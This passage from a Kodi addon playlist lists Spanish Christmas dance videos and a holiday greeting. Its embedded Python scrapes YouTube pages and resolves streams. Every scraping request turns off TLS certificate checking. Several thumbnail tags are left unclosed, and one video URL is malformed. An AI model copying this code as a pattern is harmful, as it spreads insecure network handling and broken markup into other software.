<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
<externallink>https://pastebin.com/raw/gemZkhzt</externallink>
</item>







<item>
<title>[COLOR gold]* [/COLOR][COLOR white]SESION DISCOFESTA[/COLOR]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=5brlYZm-vw8'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>   
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
</item>





<item>
<title>[COLOR gold]* [/COLOR][COLOR white]JUST DANCE NAVIDAD[/COLOR]</title>
<link>$doregex[link_inteligente]</link>
<regex>
<name>link_inteligente</name>
<listrepeat><![CDATA[
<title>[COLOR yellow]+[/COLOR] [COLOR white][link_inteligente.param1][/COLOR]</title>
<link>$doregex[id]</link>
<thumbnail>https://i.ytimg.com/vi/[link_inteligente.param2]/hqdefault.jpg</thumbnail>
<fanart>https://i.imgur.com/kKmzFLe.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'https://www.youtube.com/watch?v=LczWHYYvyx4&amp;list=PLztQv6iNC4GCFZMs2qsvdSlRXjYd5-9dw'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if '=' in url[:7]:
    if 'canal' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
    elif 'lista' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
    elif 'enlace' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
        html = url + '2018CristalAzul'
        enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
        return [(titulo, enlace)]
    else:
        return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Error [/COLOR],[COLOR white]Enlace Mal puesto[/COLOR], 4000)")
  elif 'channel' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/c/' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/user' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'list' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
  else:
    titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
    html = url + '2018CristalAzul'
    enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
    return [(titulo, enlace)]
]]></expres>
<page></page>
</regex> 
<regex>
<name>id</name>
<expres><![CDATA[#$pyFunction
import resolveurl
def GetLSProData(page_data,Cookie_Jar,m):
  url = 'https://www.youtube.com/watch?v=[link_inteligente.param2]'
  return resolveurl.resolve(url)
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
</item>



<item>
<title>[COLOR gold]* [/COLOR] [COLOR white]ZUMBA NAVIDEÑA[/COLOR]</title>
<link>$doregex[link_inteligente]</link>
<regex>
<name>link_inteligente</name>
<listrepeat><![CDATA[
<title>[COLOR yellow]+[/COLOR] [COLOR white][link_inteligente.param1][/COLOR]</title>
<link>$doregex[id]</link>
<thumbnail>https://i.ytimg.com/vi/[link_inteligente.param2]/hqdefault.jpg</thumbnail>
<fanart>https://i.imgur.com/kKmzFLe.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'http://www.youtube.com/watch?v=tuQtHzza2A8&amp;list=PLWVTnUUgGFJARI8SqVnbi6c0H0Y5BzUdI'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if '=' in url[:7]:
    if 'canal' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
    elif 'lista' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
    elif 'enlace' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
        html = url + '2018CristalAzul'
        enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
        return [(titulo, enlace)]
    else:
        return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Error [/COLOR],[COLOR white]Enlace Mal puesto[/COLOR], 4000)")
  elif 'channel' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/c/' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/user' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'list' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
  else:
    titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
    html = url + '2018CristalAzul'
    enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
    return [(titulo, enlace)]
]]></expres>
<page></page>
</regex> 
<regex>
<name>id</name>
<expres><![CDATA[#$pyFunction
import resolveurl
def GetLSProData(page_data,Cookie_Jar,m):
  url = 'https://www.youtube.com/watch?v=[link_inteligente.param2]'
  return resolveurl.resolve(url)
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
</item> 




<item>
<title>[COLOR gold]* [/COLOR][COLOR white]ENSAYANDO LAS UVAS[/COLOR]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=[https://youtu.be/tWtcS4x2NA4]'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
</item>




 <item>
<title>[COLOR gold]** [/COLOR][COLOR white]FESTAyCRISTAL FELICITA[COLOR gold] **[/COLOR]</title>
<link>$doregex[text]</link>
<regex>
<name>text</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import xbmcgui
    dialog = xbmcgui.Dialog()
    dialog.textviewer('FESTAyCRISTAL FELICITA', '[COLOR gold]El equipo Festa y cristal Azul os desea:[/COLOR]\n[COLOR aqua]TANTA SALUD[/COLOR]\n[COLOR white]como gotas tiene la lluvia[/COLOR]\n[COLOR aqua]TANTO AMOR[/COLOR]\n[COLOR white]como rayos de luz, tiene el sol[/COLOR]\n[COLOR aqua]Y TANTA SUERTE[/COLOR]\n[COLOR white]como arena tiene el desierto[/COLOR]\n[COLOR god]FELIZ NAVIDAD[/COLOR]\n[COLOR gold]Y QUE NO PARE LA FESTA.[/COLOR]')
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
</item>
